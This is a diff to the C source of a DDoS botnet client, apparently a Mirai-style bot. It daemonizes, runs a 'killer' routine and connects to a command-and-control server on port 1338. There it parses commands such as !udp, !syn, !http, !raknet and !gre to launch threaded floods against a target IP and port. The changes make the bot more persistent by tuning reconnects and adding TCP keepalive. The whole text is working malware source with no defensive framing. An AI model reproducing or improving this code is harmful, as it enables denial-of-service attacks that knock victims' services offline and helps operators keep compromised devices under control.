@@ -27,12 +27,10 @@
 
 #define CNC_IP "0.0.0.0"
 #define BOT_PORT 1338
-#define MAX_THREADS 3
+#define MAX_THREADS 2
 // recommended 2-5 (OR 1 IF LOADING LOW-END bots)
-// dont increase this too much, save resources plz
-// dont exhaust bots forever, your cnc may die sometime..
-#define MAX_RECONNECT_ATTEMPTS 8
-#define RETRY_DELAY 4 // increase this if your port speed is low 
+#define MAX_RECONNECT_ATTEMPTS 15
+#define RETRY_DELAY 5
 
 const char* get_arch() {
     #ifdef ARCH_aarch64
@@ -65,21 +63,18 @@ static pthread_t attack_threads[MAX_THREADS];
 
 void handle_command(const char *command, int sock) {
     if (!command || strlen(command) > 1023) return;
-    
     static char buffer[256];
     if (strncmp(command, "ping", 4) == 0) {
         snprintf(buffer, sizeof(buffer), "pong %s", get_arch());
         send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
         return;
     }
-
     static const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp", "!gre"};
     static const int method_len[] = {4, 4, 4, 7, 5, 7, 5, 4};
     static void* (*attack_funcs[])(void*) = {
         udp_attack, vse_attack, syn_attack, socket_attack, 
         http_attack, raknet_attack, icmp_attack, gre_attack
     };
-    
     int which = -1;
     for (int i = 0; i < 8; i++) {
         if (strncmp(command, methods[i], method_len[i]) == 0) {
@@ -87,7 +82,6 @@ void handle_command(const char *command, int sock) {
             break;
         }
     }
-
     if (which >= 0) {
         static char ip[32];
         static char argstr[512];
@@ -98,18 +92,15 @@ void handle_command(const char *command, int sock) {
         int srcport = 0;
         int gre_proto = 0;
         int gport = 0;
-
         memset(ip, 0, sizeof(ip));
         memset(argstr, 0, sizeof(argstr));
-
-        if (which == 6 || which == 7) { // ICMP or GRE (L3)
+        if (which == 6 || which == 7) {
             n = sscanf(command, "%*s %31s %d %511[^\n]", ip, &time, argstr);
             if (n < 2) return;
         } else {
             n = sscanf(command, "%*s %31s %d %d %511[^\n]", ip, &port, &time, argstr);
             if (n < 3) return;
         }
-
         if (strlen(argstr) > 0) {
             char *token = strtok(argstr, " ");
             while (token) {
@@ -123,12 +114,10 @@ void handle_command(const char *command, int sock) {
                 token = strtok(NULL, " ");
             }
         }
-
         for (int i = 0; i < MAX_THREADS; i++) {
             pthread_cancel(attack_threads[i]);
             pthread_join(attack_threads[i], NULL);
         }
-
         attack_state.target_addr.sin_family = AF_INET;
         attack_state.target_addr.sin_port = htons(port);
         inet_pton(AF_INET, ip, &attack_state.target_addr.sin_addr);
@@ -136,8 +125,7 @@ void handle_command(const char *command, int sock) {
         attack_state.psize = psize;
         attack_state.srcport = srcport;
         attack_state.active = 1;
-
-        if (which == 7) { // GRE attack
+        if (which == 7) {
             gre_attack_params* gre_state = malloc(sizeof(gre_attack_params));
             gre_state->target_addr = attack_state.target_addr;
             gre_state->duration = time;
@@ -151,7 +139,6 @@ void handle_command(const char *command, int sock) {
             pthread_create(&attack_threads[0], NULL, attack_funcs[which], &attack_state);
         }
     }
-
     if (strcmp(command, "stop") == 0) {
         attack_state.active = 0;
         for (int i = 0; i < MAX_THREADS; i++) {
@@ -166,31 +153,29 @@ int main(int argc, char** argv) {
     static struct sockaddr_in server_addr;
     static char command[1024];
     ssize_t n;
-    
-
     daemonize(argc, argv);
     start_killer();
-
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(BOT_PORT);
     inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);
-
     int connect_attempts = 0;
     int initial_connection = 1;
-
     while (connect_attempts < MAX_RECONNECT_ATTEMPTS) {
         if (sock != -1) {
             close(sock);
             sock = -1;
         }
-
         sock = socket(AF_INET, SOCK_STREAM, 0);
-        if (sock < 0) {
-            connect_attempts++;
-            sleep(RETRY_DELAY);
-            continue;
-        }
-
+        int optval = 1;
+        setsockopt(sock, SOL_SOCKET, SO_KEEPALIVE, &optval, sizeof(optval));
+        int keepidle = 30;
+        int keepintvl = 10; // FINALLY FIXED BOT DIES
+        int keepcnt = 3;
+        setsockopt(sock, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
+        setsockopt(sock, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
+        setsockopt(sock, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(optval));
+        optval = 1;
+        setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &optval, sizeof(optval));
         if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
             close(sock);
             sock = -1;
@@ -198,28 +183,21 @@ int main(int argc, char** argv) {
             sleep(RETRY_DELAY);
             continue;
         }
-
-        // successfully connected
         if (initial_connection) {
             send(sock, get_arch(), strlen(get_arch()), MSG_NOSIGNAL);
             initial_connection = 0;
             connect_attempts = 0; 
         }
-
         while ((n = recv(sock, command, sizeof(command)-1, 0)) > 0) {
             command[n] = 0;
             handle_command(command, sock);
             memset(command, 0, sizeof(command));
         }
-
-        // connection lost, begin retries again
         if (!initial_connection) {
             connect_attempts++;
         }
         sleep(RETRY_DELAY);
     }
-
-    // die
     if (sock != -1) {
         close(sock);
     }
